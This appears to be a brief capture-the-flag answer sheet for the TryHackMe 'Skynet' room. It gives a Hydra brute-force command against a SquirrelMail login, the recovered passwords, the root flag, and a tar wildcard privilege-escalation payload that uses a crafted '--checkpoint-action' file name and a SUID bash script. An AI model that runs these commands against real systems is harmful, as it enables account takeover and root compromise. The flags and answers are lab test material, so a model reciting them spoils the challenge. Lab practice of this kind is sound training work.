https://tryhackme.com/room/skynet


######################################
			Cosmin Tibuleac | 05.03.2022
######################################



# Task 1  Deploy and compromise the vulnerable machine!


1.What is Miles password for his emails?


Hydra: 
**hydra -l milesdyson -P loot/log1.txt 10.10.201.0 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -t 40**


[80][http-post-form] host: 10.10.201.0   login: milesdyson   password: cyborg007haloterminator

`cyborg007haloterminator`


2.What is the hidden directory?


*We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`*


`/45kra24zxs28v3yd`

3.What is the vulnerability called when you can include a remote file for malicious purposes?

`Remote File Inclusion `


4.What is the root flag?
`3f0372db24753accc7179a282cd6a949`



/home/milesdyson/backups/backup.sh


printf '#!/bin/bash\nchmod  +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >  --checkpoint=1
